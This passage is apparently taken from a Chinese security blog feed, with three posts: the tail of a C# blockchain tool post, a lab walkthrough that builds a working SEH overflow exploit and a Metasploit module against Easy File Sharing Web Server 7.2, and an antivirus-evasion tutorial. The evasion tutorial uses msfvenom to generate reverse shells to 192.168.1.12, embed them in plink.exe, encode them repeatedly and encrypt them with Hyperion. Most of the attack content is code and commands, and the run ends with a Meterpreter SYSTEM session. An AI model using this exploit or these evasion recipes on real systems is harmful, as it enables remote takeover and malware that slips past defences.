&#125;</span><br></pre></td></tr></table></figure>
<h3 id="时间戳转日期">6、时间戳转日期</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> DateTime <span class="title">StampToDateTime</span>(<span class="params"><span class="built_in">string</span> timeStamp</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            DateTime dateTimeStart = TimeZone.CurrentTimeZone.ToLocalTime(<span class="keyword">new</span> DateTime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">            <span class="built_in">long</span> lTime = <span class="built_in">long</span>.Parse(timeStamp + <span class="string">&quot;0000000&quot;</span>);</span><br><span class="line">            TimeSpan toNow = <span class="keyword">new</span> TimeSpan(lTime);</span><br><span class="line">            <span class="keyword">return</span> dateTimeStart.Add(toNow);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="初始化">7、初始化</h3>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">            Control.CheckForIllegalCrossThreadCalls = <span class="literal">false</span>;<span class="comment">//跨线程</span></span><br><span class="line">            textBox1.Text = <span class="string">&quot;cVmUC7masSreSGy4U8qXB7fdUKguGx7npwFKWL……………………&quot;</span>;<span class="comment">//默认私钥</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h2 id="结果演示">3. 结果演示</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c559ff2dcd6.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c55a2f27ccd.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c55a6b5e4db.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c55a9f99816.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/07/img_62c55abfc4f66.png" /></p>
]]></content>
      <categories>
        <category>程序设计</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Metasploit 实现基于 SEH 的缓冲区溢出</title>
    <url>/2021/09/26/%E4%BD%BF%E7%94%A8%20Metasploit%20%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%20SEH%20%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<h3 id="攻击机">1、攻击机</h3>
<p>kali 2019-3</p>
<p>下载地址：https://www.kali.org/get-kali/</p>
<h3 id="靶机">2、靶机</h3>
<p>winXPSP3（英文版）</p>
<h3 id="漏洞">3、漏洞</h3>
<p>Easy File Sharing Web Server 7.2</p>
<h3 id="搭建实验环境">4、搭建实验环境</h3>
<p>自行百度下载Easy File Sharing Web Server 7.2 并在XP 安装</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926193617147-1593554307.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926193635831-1906707223.png" /></p>
<h2 id="计算偏移量">2. 计算偏移量</h2>
<h3 id="使用pattern_create工具">1、使用pattern_create工具</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 10000 &gt; 10000.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="创建缓冲区溢出攻击脚本-exploit.py">2、创建缓冲区溢出攻击脚本
exploit.py</h3>
<p>需要将字符序列构造到请求头中，形成"HEAD " + 字符序列 + "
HTTP/1.0"的格式</p>
<h4 id="exploit.py">（1）exploit.py</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow</span></span><br><span class="line"><span class="comment"># Date: 2019-01-16</span></span><br><span class="line"><span class="comment"># Exploit Author: binghe</span></span><br><span class="line"><span class="comment"># Version: 7.2</span></span><br><span class="line"><span class="comment"># Tested on: XP SP3 EN</span></span><br><span class="line"><span class="comment"># category: Remote Exploit</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py ip port</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">host = <span class="built_in">str</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"> </span><br><span class="line">a = socket.socket()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Connecting to: &quot;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">a.connect((host,port))</span><br><span class="line"> </span><br><span class="line">entire=<span class="number">4500</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Next SEH</span></span><br><span class="line">buff = <span class="string">&quot;Metasploit中的pattern_create.rb生成的字符序列&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># HEAD</span></span><br><span class="line">a.send(<span class="string">&quot;HEAD &quot;</span> + buff + <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line">a.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done...&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>将Metasploit中的pattern_create.rb生成的字符序列替换到 "buff
= "Metasploit中的pattern_create.rb生成的字符序列""处即可</strong></li>
<li><strong>脚本来源：https://blog.csdn.net/l1028386804/article/details/86506457</strong></li>
</ul>
<h4 id="kali-运行缓冲区溢出脚本测试">（2）kali
运行缓冲区溢出脚本测试</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># python exploit.py  10.10.10.131 90</span></span><br><span class="line">Connecting to: 10.10.10.131:90</span><br><span class="line">Done...</span><br><span class="line">root@kali:~/Desktop<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<h4
id="查看靶机上easy-file-sharing-web-server-7.2的状态">（3）查看靶机上Easy
File Sharing Web Server 7.2的状态</h4>
<p>在靶机上可以看到Easy File Sharing Web Server
7.2程序由于缓冲区溢出从而退出了程序，说明我们的缓冲区溢出脚本exploit.py生效。</p>
<h3
id="启动easy-file-sharing-web-server-7.2并将进程加载到immunitydebbuger中">3、启动Easy
File Sharing Web Server 7.2并将进程加载到ImmunityDebbuger中</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194611925-2136344893.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194615596-1340887580.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194620709-1130835393.png" /></p>
<h3 id="运行缓冲区溢出脚本">4、运行缓冲区溢出脚本</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop<span class="comment"># python exploit.py  10.10.10.131 90</span></span><br><span class="line">Connecting to: 10.10.10.131:90</span><br><span class="line">Done...</span><br><span class="line">root@kali:~/Desktop<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<h3 id="查看easy-file-sharing-web-server-7.2溢出地址">5、查看Easy File
Sharing Web Server 7.2溢出地址</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194801578-672071654.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926194807039-914211737.png" /></p>
<p>** catch块的地址为46356646， 下一条SEH记录地址为34664633**</p>
<h3 id="使用pattern_offset工具">6、使用pattern_offset工具</h3>
<h4 id="计算catch块偏移量">（1）计算catch块偏移量</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@binghe:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46356646 -l 10000</span></span><br><span class="line">[*] Exact match at offset 4065</span><br></pre></td></tr></table></figure>
<h4 id="计算下一条seh记录偏移量">（2）计算下一条SEH记录偏移量</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@binghe:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 34664633 -l 10000</span></span><br><span class="line">[*] Exact match at offset 4061</span><br></pre></td></tr></table></figure>
<h2 id="查找-poppopret-地址">3. 查找 POP/POP/RET 地址</h2>
<h3 id="mona脚本">1、Mona脚本</h3>
<p>下载地址：https://github.com/corelan/mona</p>
<p>将mona.py放到与ImmunityDebugger.exe同级目录的PyCommands目录下</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926195211728-1769629968.png" /></p>
<h3 id="启动mona">2、启动Mona</h3>
<p>在ImmunityDebugger命令行下输入"!mona
modules"命令启动Mona分析DLL文件。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926195242617-504157726.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20210926195246372-1984781649.png" /></p>
<h3
id="使用msfbinscan计算poppopret地址">3、使用msfbinscan计算POP/POP/RET地址</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; msfbinscan -p /home/kali/Desktop/ImageLoad.dll</span><br><span class="line">[*] <span class="built_in">exec</span>: msfbinscan -p /home/kali/Desktop/ImageLoad.dll</span><br><span class="line"></span><br><span class="line">[/home/kali/Desktop/ImageLoad.dll]</span><br><span class="line">0x1000108b pop ebp; pop ebx; ret</span><br><span class="line">0x10001274 pop ebp; pop ebx; ret</span><br><span class="line">0x10001877 pop esi; pop ebx; ret</span><br><span class="line">0x100018e0 pop esi; pop ebx; ret</span><br><span class="line">0x10001d9f pop ebp; pop ebx; ret</span><br><span class="line">0x100026e1 pop edi; pop ebx; ret</span><br><span class="line">0x1000283e pop edi; pop esi; ret</span><br><span class="line">0x100028ab pop edi; pop esi; ret</span><br><span class="line">0x100029b5 pop esi; pop ebx; ret</span><br><span class="line">0x10002b9b pop ebp; pop ebx; ret</span><br><span class="line">…………</span><br><span class="line">0x1002379d pop ebp; pop ebx; ret</span><br><span class="line">0x100237cc pop ebp; pop ebx; ret</span><br><span class="line">0x100237dc pop ebp; pop ebx; ret</span><br><span class="line">0x10023945 pop edi; pop esi; ret</span><br><span class="line">0x1002483f pop esi; pop ebx; ret</span><br><span class="line">0x100248be pop esi; pop ebx; ret</span><br><span class="line">0x100248ce pop esi; pop ebx; ret</span><br><span class="line">0x100248df pop esi; pop ebx; ret</span><br></pre></td></tr></table></figure>
<p>地址选择：排除掉所有可能会引起HTTP协议问题的地址（例如说连续不断的0）</p>
<p>此处以 <strong>0x1002379d</strong> 作为 POP/POP/RET的地址为例</p>
<h2 id="编写-metasploit-的-seh-渗透模块">4. 编写 Metasploit 的 SEH
渗透模块</h2>
<h3 id="渗透代码最终版">1、渗透代码（最终版）</h3>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line"></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">NormalRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Seh</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;SEH Overflow Easy File Sharing HTTP Server 7.2&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q(</span></span><br><span class="line"><span class="string">      This module demonstrate SEH based overflow example</span></span><br><span class="line"><span class="string">    )</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span> =&gt; <span class="variable constant_">MSF_LICENSE</span>,</span><br><span class="line">      <span class="string">&#x27;Privileged&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&#x27;EXITFUNC&#x27;</span> =&gt; <span class="string">&#x27;thread&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;RPORT&#x27;</span> =&gt; <span class="number">80</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span> =&gt;</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&#x27;Space&#x27;</span> =&gt; <span class="number">390</span>,</span><br><span class="line">        <span class="string">&#x27;BadChars&#x27;</span> =&gt; <span class="string">&quot;\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span> =&gt; </span><br><span class="line">        [</span><br><span class="line">          [</span><br><span class="line">            <span class="string">&#x27;Easy File Sharing 7.2 HTTP&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&#x27;Ret&#x27;</span> =&gt; <span class="number">0x1002379d</span>,</span><br><span class="line">              <span class="string">&#x27;Offset&#x27;</span> =&gt; <span class="number">4061</span></span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">        ],</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2021-09-26&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">    connect</span><br><span class="line">    weapon=<span class="string">&quot;HEAD &quot;</span></span><br><span class="line">    weapon&lt;&lt;make_nops(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">    weapon&lt;&lt;generate_seh_record(target.ret)</span><br><span class="line">    weapon&lt;&lt;make_nops(<span class="number">19</span>)</span><br><span class="line">    weapon&lt;&lt;payload.encoded</span><br><span class="line">    weapon&lt;&lt;<span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line">    sock.put(weapon)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：HEAD后面和HTTP前面都是有空格的！！！</strong></p>
<h3 id="代码简要分析">2、代码简要分析</h3>
<h4 id="target">（1）Target</h4>
<ul>
<li>变量Ret（ return address）中保存POP/POP/RET指令的地址
0x1002379d</li>
<li>变量Offset中保存偏移量4061</li>
<li>之所以使用4061来代替4065，是因为Metasploit会自动生成一个到ShellCode的短跳转指令。因此，要将4065字节的地址向前移4个字节，这样就可以把短跳转指令放到原本用来存放下一条SEH记录地址的位置。</li>
</ul>
<h4 id="exploit">（2）exploit</h4>
<ul>
<li>使用generate_seh_record()函数跳过提供跳转指令和到达攻击载荷的字节数量。</li>
<li>接下来，我们要在攻击载荷前填充一些数据，用来消除影响攻击载荷运行的不利因素</li>
<li>使用HTTP/1.0。</li>
<li>最后，将保存在变量weapon中的数据发送到目标上</li>
<li>然后调用handler方法来检查该尝试是否成功。如果成功，我们将获得控制目标的权限。</li>
</ul>
<h3 id="代码调试所遇问题">3、代码调试所遇问题</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/dev<span class="comment"># ./msftidy.rb /usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb </span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [WARNING] Explicitly requiring/loading msf/core is not necessary  <span class="comment">#删掉require &#x27;msf/core&#x27;即可</span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [INFO] No CVE references found. Please check before you land!   </span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [ERROR] Incorrect disclosure <span class="built_in">date</span> format  <span class="comment">#正确：2021-09-26，错误：2021-9-26</span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [WARNING] Please use <span class="string">&#x27;MetasploitModule&#x27;</span> as the class name (you used Metasploit4)  <span class="comment">#将Metasploit4改为MetasploitModule</span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb:27 - [WARNING] Spaces at EOL</span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/dev<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<h3 id="msf-运行测试">4、msf 运行测试</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/<span class="comment"># msfconsole</span></span><br><span class="line">…………</span><br><span class="line">…………</span><br><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/seh_attack_by_z9m8r8 </span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; <span class="built_in">set</span> rhost 10.10.10.131</span><br><span class="line">rhost =&gt; 10.10.10.131</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; <span class="built_in">set</span> rport 90</span><br><span class="line">rport =&gt; 90</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.131:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.148:38999 -&gt; 10.10.10.131:4444) at 2021-09-25 22:16:28 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
<p><strong>参考自：</strong></p>
<p>https://blog.csdn.net/l1028386804/article/details/86506457</p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀</title>
    <url>/2023/02/03/%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h2 id="免杀简介">1. 免杀简介</h2>
<h3 id="恶意软件">1、恶意软件</h3>
<ul>
<li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装</li>
<li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li>
</ul>
<h3 id="防病毒软件">2、防病毒软件</h3>
<ul>
<li><strong>恶意程序最主要的防护手段</strong></li>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒</li>
<li><strong>检测原理</strong></li>
<li>基于二进制文件中特征签名的黑名单检测方法</li>
<li>基于行为的分析方法（启发式）</li>
<li><strong>事后手段</strong></li>
<li>永远落后于病毒发展</li>
</ul>
<h3 id="免杀技术">3、免杀技术</h3>
<ul>
<li><strong>修改二进制文件中的特征字符</strong></li>
<li>替换、擦除、修改</li>
<li><strong>加密技术（crypter）</strong></li>
<li>通过加密是的特征字符不可读，从而台币AV 检测</li>
<li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li>
<li><strong>防病毒软件的检测</strong></li>
<li>恶意程序本身的特征字符</li>
<li>加密器 cripter 的特征字符</li>
</ul>
<h3 id="当前现状">4、当前现状</h3>
<ul>
<li><strong>恶意软件制造者</strong></li>
<li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li>
<li>使用独有 crypter 软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable 还最高追求 （FUD）</li>
<li><strong>AV 厂商</strong></li>
<li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li>
<li>一般新的恶意软件安全 UD 窗口期是一周左右</li>
<li>与恶意软件制造者永无休止的拉锯战</li>
<li>信的启发式检测技术尚有待完善(误杀漏杀)</li>
<li><strong>单一 AV 厂商的病毒库很难达到 100% 覆盖</strong></li>
<li>https://www.virustotal.com/
接口被某些国家的AV软禁免费利用，没有自己的病毒库</li>
<li><strong>http://www.virscan.org/</strong></li>
<li><strong>在线多引擎查杀网站与 AV 查杀共享信息</strong></li>
<li><strong>在线多引擎查毒站</strong></li>
<li>https://cn-sec.com/archives/552229.html</li>
<li><strong>常用的 RAT 软件</strong></li>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
</ul>
<h2 id="msfvenom工具">2. msfvenom工具</h2>
<h3 id="生成shell"><strong>1、生成shell</strong></h3>
<ul>
<li><strong>生成未加密正向shell
，lhost：目标机（靶机）IP，可不指定</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell/ **bind_tcp** lhost=127.0.0.1 lport=4444 -a x86 --platform win -f exe -o test-1.exe</span><br><span class="line"><span class="comment">#-p 是payload  -a 目标机架构  -f 是生成的后门的格式  -o 是输出文件名</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125348597-1652951932.png" /></p>
<ul>
<li><strong>加密编码shell</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell/bind_tcp lhost=192.168.1.12 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | </span><br><span class="line"></span><br><span class="line">msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">&#x27;\x00&#x27;</span> -f exe -o test-2.exe</span><br><span class="line"><span class="comment">#-e 加密模块  -i 加密次数  -b 过滤掉特殊字符</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125425339-1546134190.png" /></p>
<ul>
<li><strong>可使用 strings 对比加密前后可读字符串</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203125803621-144937208.png" /></p>
<ul>
<li><strong>比较编码前后的检测率：</strong><a
href="http://www.virscan.org/language/zh-cn/"
class="uri">http://www.virscan.org/language/zh-cn/</a></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203131901344-1983284131.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203131919718-310995010.png" /></p>
<h3 id="利用模板隐藏shell"><strong>2、利用模板隐藏shell</strong></h3>
<p>也就是说通过将shell绑定到某些正常的软件（模板）上来隐藏自身。</p>
<ul>
<li><strong>未加密编码</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=192.168.1.12 lport=4444 -a x86 --platform win -f exe -o test-3.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>加密编码</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=192.168.1.12 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe -o test-4.exe</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>在线查毒对比</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203132844282-1413037400.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203132901569-164619933.png" /></p>
<h2 id="加密免杀">3. 加密免杀</h2>
<ul>
<li><p>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</p></li>
<li><p>常被恶意软件用于免杀目的</p></li>
</ul>
<h3 id="hyperion-32bit-pe-程序加密器">1、Hyperion （32bit PE
程序加密器）</h3>
<ul>
<li>Crypter / Container（解密器 PE Loader ）</li>
</ul>
<h4 id="kali自带的-hyperion推荐">（1）kali自带的 Hyperion【推荐】</h4>
<p><strong>位置：</strong> /usr/share/windows-resources/hyperion</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203193713358-1564104803.png" /></p>
<h4 id="自己编译安装不推荐">（2）自己编译安装【不推荐】</h4>
<ul>
<li>下载：<a
href="https://github.com/nullsecuritynet/tools/blob/master/binary/hyperion/release/Hyperion-2.3.zip"
class="uri">https://github.com/nullsecuritynet/tools/blob/master/binary/hyperion/release/Hyperion-2.3.zip</a></li>
<li><strong>编译生成加密器</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203151028476-206335.png" /></p>
<ul>
<li>若下载的是1.2版本可用以下命令生成</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o en.exe   <span class="comment"># -static-libgcc -static-libstdc++ 是exe执行会调用的动态库（此处是将这两个动态链接库静态编译进exe）</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203151633625-1872506840.png" /></p>
<ul>
<li><strong>2.2，2.3版本可能的报错及解决方法</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203151115635-2086677343.png" /></p>
<p>将makefile第1行cc=后面的gcc替换成i686-w64-mingw32-gcc。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203150813046-603410208.png" /></p>
<p>重新make即可。</p>
<p>注意，这种方法生成的2.3版本的hyperion.exe在对shell加密时会出现以下问题，1.2版会出现动态链接库找不到的问题。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203181654911-1846085260.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203181850849-1120631449.png" /></p>
<h3 id="安装wine">2、安装wine</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install wine  </span><br><span class="line"><span class="comment">#也可 dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32 安装时间较长</span></span><br></pre></td></tr></table></figure>
<h3 id="生成shell-1"><strong>3、生成shell</strong></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=192.168.1.12 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe -o test-5.exe</span><br></pre></td></tr></table></figure>
<h3 id="加密shell"><strong>4、加密shell</strong></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine /usr/share/windows-resources/hyperion/hyperion.exe test-5.exe test-6.exe  <span class="comment">#用hyperion.exe加密test-5.exe生成test-6.exe</span></span><br></pre></td></tr></table></figure>
<h3 id="strings-对比加密前后可读字符串">5、strings
对比加密前后可读字符串</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230203194702433-184705601.png" /></p>
